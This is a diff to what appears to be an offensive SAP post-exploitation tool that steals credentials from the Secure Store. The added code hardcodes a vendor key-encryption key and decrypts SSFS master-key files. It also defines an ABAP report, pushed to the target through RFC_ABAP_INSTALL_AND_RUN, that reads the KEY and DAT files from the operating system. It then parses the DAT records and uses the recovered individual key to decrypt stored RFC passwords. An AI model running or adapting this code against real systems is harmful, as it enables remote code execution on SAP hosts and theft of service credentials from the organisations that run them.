@@ -46,8 +46,17 @@ from sapmap_models import Credentials, RFCConnection
 # this key unless the admin has configured an individual key).
 DEFAULT_KEY_HEX = "b1e09244ec19eb3401dfc846ab225820c71bc376581eb3e4"
 
+# Hardcoded KEK (Key Encryption Key) used to decrypt SSFS_<SID>.KEY files
+# that use the encrypted format (187 bytes).  Embedded in all SAP rsecssfx
+# binaries — same on every installation.
+_SSFS_KEK_HEX = "9f60a6dd7e157d070cc357909aa290e9360eee472fda4772"
+
 # RSECTAB.DATA is RAW(184) = 184 bytes = 368 hex chars
 _DATA_LEN_BYTES = 184
+
+# SSFS key file sizes
+_SSFS_KEY_PLAIN_SIZE = 92    # SAPSSFSKey   — key at offset 12, 24 bytes
+_SSFS_KEY_ENC_SIZE   = 187   # SAPSSFSKeyE  — encrypted key at offset 130, 57 bytes
 
 
 # ---------------------------------------------------------------------------
@@ -60,6 +69,12 @@ def _require_crypto():
             "pycryptodome is required for SecStore decryption. "
             "Install with:  pip install pycryptodome"
         )
+
+
+def _des_ecb_encrypt(key8: bytes, block8: bytes) -> bytes:
+    """Single DES ECB encrypt of one 8-byte block."""
+    c = _CryptoDES.new(key8, _CryptoDES.MODE_ECB)
+    return c.encrypt(block8)
 
 
 def _des3_manual(key24: bytes, data: bytes) -> bytes:
@@ -108,6 +123,314 @@ def _derive_keyprime(keydef: bytes, data_pass1: bytes) -> bytes:
 
 
 # ---------------------------------------------------------------------------
+# SSFS key file extraction
+# ---------------------------------------------------------------------------
+
+def extract_ssfs_key(key_file_bytes: bytes) -> bytes:
+    """Extract the 24-byte SSFS master key from a SSFS_<SID>.KEY file.
+
+    Two formats exist:
+      - Plaintext  (92 bytes):  key at offset 12, 24 raw bytes
+      - Encrypted (187 bytes):  encrypted key at offset 130, 57 bytes,
+                                 decrypted with the hardcoded KEK
+
+    Returns the 24-byte key, or raises ValueError on failure.
+    """
+    _require_crypto()
+
+    preamble = key_file_bytes[:11]
+    if preamble != b"RSecSSFsKey":
+        raise ValueError(
+            f"Not an SSFS key file (preamble: {preamble!r}, expected b'RSecSSFsKey')"
+        )
+
+    size = len(key_file_bytes)
+
+    # --- Plaintext format (92 bytes) ---
+    if size == _SSFS_KEY_PLAIN_SIZE:
+        key = key_file_bytes[12:36]
+        if len(key) != 24:
+            raise ValueError(f"Plaintext key truncated: {len(key)} bytes")
+        print(f"[*] SSFS key file: plaintext format ({size} bytes)")
+        return key
+
+    # --- Encrypted format (187 bytes) ---
+    if size == _SSFS_KEY_ENC_SIZE:
+        return _decrypt_ssfs_key_enc(key_file_bytes)
+
+    # Unknown size — try to detect
+    if size > _SSFS_KEY_ENC_SIZE:
+        print(f"[*] SSFS key file: oversized ({size} bytes), trying encrypted format")
+        return _decrypt_ssfs_key_enc(key_file_bytes)
+
+    raise ValueError(f"Unknown SSFS key file size: {size} bytes")
+
+
+def _decrypt_ssfs_key_enc(key_file_bytes: bytes) -> bytes:
+    """Decrypt the encrypted SSFS key using the hardcoded KEK.
+
+    Algorithm (from pysap rsec_decrypt_key):
+      1. Take 56 bytes of encrypted key (offset 130-185)
+      2. DES-CBC decrypt with KEK[16:24]  (last 8 bytes)
+      3. DES-CBC encrypt with KEK[8:16]   (middle 8 bytes)
+      4. DES-CBC decrypt with KEK[0:8]    (first 8 bytes)
+      5. Byte 57 (offset 186) = special XOR with intermediate ciphertexts
+      6. Final key = result[33:56] + [last_byte] = 24 bytes
+    """
+    kek = bytes.fromhex(_SSFS_KEK_HEX)
+    key_enc = key_file_bytes[130:]
+    if len(key_enc) < 57:
+        raise ValueError(f"Encrypted key too short: {len(key_enc)} bytes (need 57)")
+
+    enc_block = key_enc[:56]   # first 56 bytes
+    last_byte = key_enc[56]    # byte 57
+
+    iv = b"\x00" * 8
+
+    # Round 1: DES-CBC decrypt with KEK[16:24]
+    c1 = _CryptoDES.new(kek[16:24], _CryptoDES.MODE_CBC, iv)
+    r1 = c1.decrypt(enc_block)
+
+    # Round 2: DES-CBC encrypt with KEK[8:16]
+    c2 = _CryptoDES.new(kek[8:16], _CryptoDES.MODE_CBC, iv)
+    r2 = c2.encrypt(r1)
+
+    # Round 3: DES-CBC decrypt with KEK[0:8]
+    c3 = _CryptoDES.new(kek[0:8], _CryptoDES.MODE_CBC, iv)
+    r3 = c3.decrypt(r2)
+
+    # Last byte: XOR with DES-ECB encryptions of CBC carry blocks.
+    # Round 1 carry = last input ciphertext block (enc_block[48:56])
+    # Round 2 carry = last OUTPUT ciphertext block (r2[48:56])
+    # Round 3 carry = last input ciphertext block to round 3 = r2[48:56]
+    xb = last_byte
+    xb ^= _des_ecb_encrypt(kek[16:24], enc_block[48:56])[0]   # round 1
+    xb ^= _des_ecb_encrypt(kek[8:16],  r2[48:56])[0]          # round 2
+    xb ^= _des_ecb_encrypt(kek[0:8],   r2[48:56])[0]          # round 3
+
+    # Final key: bytes 33-56 of r3 + the XOR'd last byte = 24 bytes
+    key = r3[33:56] + bytes([xb])
+    if len(key) != 24:
+        raise ValueError(f"Decrypted key wrong size: {len(key)} bytes (expected 24)")
+
+    print(f"[*] SSFS key file: encrypted format ({len(key_file_bytes)} bytes), "
+          f"decrypted to {len(key)}-byte key")
+    return key
+
+
+# ---------------------------------------------------------------------------
+# SSFS DAT file parsing
+# ---------------------------------------------------------------------------
+
+def parse_ssfs_dat(dat_file_bytes: bytes, ssfs_key: bytes = None) -> list:
+    """Parse an SSFS_<SID>.DAT file and return decrypted records.
+
+    Record structure (from pysap SAPSSFS.py):
+      Record header (24 bytes):
+        bytes  0-11: preamble "RSecSSFsData"
+        bytes 12-15: total record length (4 bytes, big-endian)
+        byte  16:    type (1 = supported)
+        bytes 17-23: filler
+      Data header (152 bytes):
+        bytes 24-87:   key_name / IDENT (64 bytes, space-padded)
+        bytes 88-95:   timestamp
+        bytes 96-119:  user (24 bytes)
+        bytes 120-143: host (24 bytes)
+        byte  144:     is_deleted
+        byte  145:     is_stored_as_plaintext
+        byte  146:     is_binary_data
+        bytes 147-155: filler
+        bytes 156-175: HMAC-SHA1 (20 bytes)
+      Data payload (variable):
+        bytes 176+:  encrypted data (length = total_length - 176)
+
+    If ssfs_key is provided, each record's data payload is decrypted with it.
+    Returns list of (ident, data_hex) tuples where data_hex is the encrypted
+    (or decrypted) payload as hex.
+    """
+    _REC_PREAMBLE = b"RSecSSFsData"
+    _REC_HEADER_LEN = 176
+    _MIN_REC_SIZE = _REC_HEADER_LEN
+
+    if len(dat_file_bytes) < 24:
+        print(f"[-] SSFS DAT file too small: {len(dat_file_bytes)} bytes")
+        return []
+
+    records = []
+    # Scan for record preambles — this is robust against unknown file headers
+    pos = 0
+    while pos + _MIN_REC_SIZE <= len(dat_file_bytes):
+        # Find next record preamble
+        idx = dat_file_bytes.find(_REC_PREAMBLE, pos)
+        if idx < 0:
+            break
+        pos = idx
+
+        if pos + _MIN_REC_SIZE > len(dat_file_bytes):
+            break
+
+        # Parse record length at offset 12 (4 bytes big-endian)
+        rec_len = int.from_bytes(dat_file_bytes[pos + 12:pos + 16], "big")
+        if rec_len < _REC_HEADER_LEN or rec_len > 0x18150:
+            pos += 12  # skip this preamble occurrence, try next
+            continue
+
+        if pos + rec_len > len(dat_file_bytes):
+            break
+
+        # Record type at offset 16
+        rec_type = dat_file_bytes[pos + 16]
+
+        # Key name (IDENT) at offset 24, 64 bytes, space-padded
+        ident_raw = dat_file_bytes[pos + 24:pos + 88]
+        ident = ident_raw.rstrip(b" \x00").decode("ascii", errors="replace").strip()
+
+        # Flags
+        is_deleted    = dat_file_bytes[pos + 144]
+        is_plaintext  = dat_file_bytes[pos + 145]
+
+        # Data payload
+        data_start = pos + _REC_HEADER_LEN
+        data_len   = rec_len - _REC_HEADER_LEN
+        data_bytes = dat_file_bytes[data_start:data_start + data_len]
+
+        if ident and not is_deleted and data_len > 0:
+            # Decrypt with SSFS key if provided and data is encrypted
+            if ssfs_key and not is_plaintext and data_len >= 8 and data_len % 8 == 0:
+                try:
+                    data_bytes = _des3_manual(ssfs_key, data_bytes)
+                except Exception:
+                    pass  # leave as encrypted
+            records.append((ident, data_bytes.hex().upper()))
+
+        pos += rec_len  # advance to next record
+
+    print(f"[*] SSFS DAT: parsed {len(records)} records from {len(dat_file_bytes)} bytes")
+    return records
+
+
+# ---------------------------------------------------------------------------
+# ABAP program to read SSFS files from the OS filesystem
+# ---------------------------------------------------------------------------
+
+# Reads both KEY and DAT files via OPEN DATASET, base64-encodes them,
+# and outputs in chunked lines that fit the WRITES ZEILE width limit.
+_ABAP_READ_SSFS_FILES = [
+    "REPORT ZSECSSFS LINE-SIZE 500.",
+    "DATA: KEYPATH TYPE STRING.",
+    "DATA: DATPATH TYPE STRING.",
+    "DATA: XSTR TYPE XSTRING.",
+    "DATA: B64 TYPE STRING.",
+    "DATA: CHUNK(200) TYPE C.",
+    "DATA: OFF TYPE I.",
+    "DATA: CLEN TYPE I.",
+    "DATA: REMAIN TYPE I.",
+    "DATA: SID3(3) TYPE C.",
+    "SID3 = SY-SYSID.",
+    "CONCATENATE '/usr/sap/' SID3 '/SYS/global/security/rsecssfs/key/SSFS_' SID3 '.KEY' INTO KEYPATH.",
+    "CONCATENATE '/usr/sap/' SID3 '/SYS/global/security/rsecssfs/data/SSFS_' SID3 '.DAT' INTO DATPATH.",
+    "OPEN DATASET KEYPATH FOR INPUT IN BINARY MODE.",
+    "IF SY-SUBRC = 0.",
+    "  READ DATASET KEYPATH INTO XSTR.",
+    "  CLOSE DATASET KEYPATH.",
+    "  CALL METHOD CL_HTTP_UTILITY=>ENCODE_X_BASE64 EXPORTING UNENCODED = XSTR RECEIVING ENCODED = B64.",
+    "  CLEN = STRLEN( B64 ).",
+    "  WRITE: / '~~~KEYLEN', CLEN.",
+    "  OFF = 0.",
+    "  WHILE OFF < CLEN.",
+    "    REMAIN = CLEN - OFF.",
+    "    IF REMAIN > 200. REMAIN = 200. ENDIF.",
+    "    CHUNK = B64+OFF(REMAIN).",
+    "    WRITE: / '~~~K', CHUNK.",
+    "    OFF = OFF + 200.",
+    "  ENDWHILE.",
+    "ELSE.",
+    "  WRITE: / '~~~KEYERR', SY-SUBRC.",
+    "ENDIF.",
+    "CLEAR: XSTR, B64.",
+    "OPEN DATASET DATPATH FOR INPUT IN BINARY MODE.",
+    "IF SY-SUBRC = 0.",
+    "  READ DATASET DATPATH INTO XSTR.",
+    "  CLOSE DATASET DATPATH.",
+    "  CALL METHOD CL_HTTP_UTILITY=>ENCODE_X_BASE64 EXPORTING UNENCODED = XSTR RECEIVING ENCODED = B64.",
+    "  CLEN = STRLEN( B64 ).",
+    "  WRITE: / '~~~DATLEN', CLEN.",
+    "  OFF = 0.",
+    "  WHILE OFF < CLEN.",
+    "    REMAIN = CLEN - OFF.",
+    "    IF REMAIN > 200. REMAIN = 200. ENDIF.",
+    "    CHUNK = B64+OFF(REMAIN).",
+    "    WRITE: / '~~~D', CHUNK.",
+    "    OFF = OFF + 200.",
+    "  ENDWHILE.",
+    "ELSE.",
+    "  WRITE: / '~~~DATERR', SY-SUBRC.",
+    "ENDIF.",
+]
+
+
+def _read_ssfs_files_via_abap(node, creds) -> tuple:
+    """Read SSFS KEY and DAT files from the SAP OS via RFC_ABAP_INSTALL_AND_RUN.
+
+    Returns (key_bytes, dat_bytes) — either or both may be None if not available.
+    """
+    import base64
+
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_SSFS_FILES,
+                                                "ZSECSSFS")
+            if not res.get("success"):
+                print(f"[-] SSFS file read failed: {res.get('error')}")
+                return None, None
+
+            output = res.get("output", [])
+            key_b64_parts = []
+            dat_b64_parts = []
+
+            for line in output:
+                if line.startswith("~~~KEYERR"):
+                    err = line.split(None, 1)[1] if " " in line else line
+                    print(f"[*] SSFS KEY file not accessible: {err}")
+                elif line.startswith("~~~KEYLEN"):
+                    klen = line.split(None, 1)[1].strip() if " " in line else "?"
+                    print(f"[*] SSFS KEY file: {klen} base64 chars")
+                elif line.startswith("~~~K"):
+                    key_b64_parts.append(line[4:].strip())
+                elif line.startswith("~~~DATERR"):
+                    err = line.split(None, 1)[1] if " " in line else line
+                    print(f"[*] SSFS DAT file not accessible: {err}")
+                elif line.startswith("~~~DATLEN"):
+                    dlen = line.split(None, 1)[1].strip() if " " in line else "?"
+                    print(f"[*] SSFS DAT file: {dlen} base64 chars")
+                elif line.startswith("~~~D"):
+                    dat_b64_parts.append(line[4:].strip())
+
+            key_bytes = None
+            dat_bytes = None
+
+            if key_b64_parts:
+                try:
+                    key_bytes = base64.b64decode("".join(key_b64_parts))
+                    print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
+                except Exception as e:
+                    print(f"[-] SSFS KEY base64 decode failed: {e}")
+
+            if dat_b64_parts:
+                try:
+                    dat_bytes = base64.b64decode("".join(dat_b64_parts))
+                    print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
+                except Exception as e:
+                    print(f"[-] SSFS DAT base64 decode failed: {e}")
+
+            return key_bytes, dat_bytes
+
+    except Exception as e:
+        print(f"[-] SSFS file read error: {e}")
+        return None, None
+
+
+# ---------------------------------------------------------------------------
 # Public decrypt function
 # ---------------------------------------------------------------------------
 
@@ -133,12 +456,17 @@ def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
         keydef = bytes.fromhex(key_hex)
         data   = bytes.fromhex(data_hex)
 
-        if len(data) != _DATA_LEN_BYTES:
+        # Data must be a multiple of 8 (DES block size) and at least 184 bytes
+        # for RSECTAB.  SSFS records may differ in size.
+        if len(data) < 136:
             result["error"] = (
-                "unexpected DATA length %d bytes (expected %d)"
-                % (len(data), _DATA_LEN_BYTES)
+                "DATA too short for decryption: %d bytes (need >= 136)"
+                % len(data)
             )
             return result
+        if len(data) % 8 != 0:
+            # Pad to next 8-byte boundary with nulls
+            data = data + b"\x00" * (8 - len(data) % 8)
 
         # Step 1: decrypt with default/supplied key
         data_pass1 = _des3_manual(keydef, data)
@@ -225,25 +553,76 @@ _ABAP_READ_RSECTAB = [
 
 def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
     """
-    1. Read RSECTAB via ABAP program (hex-encodes the RAW DATA field).
-    2. Decrypt each row.
-    3. Return a list of dicts: ident, password, sid, instance_nr, error.
+    Read and decrypt SAP Secure Store entries.
+
+    Strategy (in order of preference):
+      1. Read SSFS files from OS filesystem (KEY + DAT) — handles individual keys
+      2. Read RSECTAB via ABAP program — fallback for DB-backed secure stores
+      3. Read RSECTAB via RFC_READ_TABLE — last resort
+
+    The SSFS key file is always read (if available) to support systems that use
+    an individual encryption key instead of the default.
     """
     _require_crypto()
 
-    # --- Try ABAP execution first (reliable for RAW fields) ---------------
+    # --- Step 1: Try to read SSFS files from OS ---
+    print(f"[*] SecStore {node.sid}: reading SSFS files from OS filesystem...")
+    key_bytes, dat_bytes = _read_ssfs_files_via_abap(node, creds)
+
+    # Extract SSFS master key from KEY file (if available)
+    ssfs_key = None
+    if key_bytes:
+        try:
+            ssfs_key = extract_ssfs_key(key_bytes)
+        except Exception as e:
+            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {e}")
+
+    # Parse SSFS DAT file — decrypt records with SSFS key, and look for
+    # the RSECTAB individual key stored as SECSTORE_DB/KEY/...
+    actual_key_hex = key_hex   # start with default
+    rows = None
+    if dat_bytes and ssfs_key:
+        try:
+            ssfs_records = parse_ssfs_dat(dat_bytes, ssfs_key)
+            if ssfs_records:
+                print(f"[+] SecStore {node.sid}: {len(ssfs_records)} records from SSFS DAT")
+
+            # Look for the RSECTAB individual key inside the SSFS records
+            for ident, data_hex in ssfs_records:
+                if ident.startswith("SECSTORE_DB/KEY/"):
+                    # The decrypted record contains the 24-byte RSECTAB key
+                    # It may have padding/wrapper — try to find 24 usable bytes
+                    raw = bytes.fromhex(data_hex)
+                    if len(raw) >= 24:
+                        candidate = raw[:24]
+                        actual_key_hex = candidate.hex()
+                        print(f"[+] SecStore {node.sid}: found RSECTAB individual key "
+                              f"in SSFS record '{ident}'")
+                        if actual_key_hex != DEFAULT_KEY_HEX:
+                            print(f"[+] SecStore {node.sid}: key differs from default")
+                    break
+
+            # The SSFS DAT itself doesn't contain the same records as RSECTAB
+            # (it stores PKI pins, PSE data, and the SECSTORE_DB key itself).
+            # We still need RSECTAB for the actual RFC passwords etc.
+        except Exception as e:
+            print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {e}")
+
+    # --- Step 2: Read RSECTAB (the actual secure store entries) ---
+    print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
     rows = _read_rsectab_via_abap(node, creds)
 
     if rows is None:
-        # Fall back to RFC_READ_TABLE (may work on some systems)
         print("[*] SecStore: ABAP exec unavailable, falling back to RFC_READ_TABLE")
         rows = _read_rsectab_via_rfc(node, creds)
 
     if not rows:
-        print(f"[-] SecStore {node.sid}: no rows returned from RSECTAB")
+        print(f"[-] SecStore {node.sid}: no entries found")
         return []
 
-    print(f"[*] SecStore {node.sid}: {len(rows)} rows read, decrypting...")
+    # --- Step 3: Decrypt all entries ---
+    print(f"[*] SecStore {node.sid}: {len(rows)} entries, decrypting "
+          f"(key: {'individual' if actual_key_hex != DEFAULT_KEY_HEX else 'default'})...")
 
     results = []
     for ident, data_hex in rows:
@@ -254,15 +633,8 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
             results.append(entry)
             continue
 
-        if len(data_hex) != _DATA_LEN_BYTES * 2:
-            entry["error"] = (
-                "DATA field length %d hex chars (expected %d)"
-                % (len(data_hex), _DATA_LEN_BYTES * 2)
-            )
-            results.append(entry)
-            continue
-
-        dec = decrypt_entry(data_hex, key_hex)
+        # SSFS DAT records may have variable sizes, not just 184 bytes
+        dec = decrypt_entry(data_hex, actual_key_hex)
         entry.update(dec)
         results.append(entry)
 
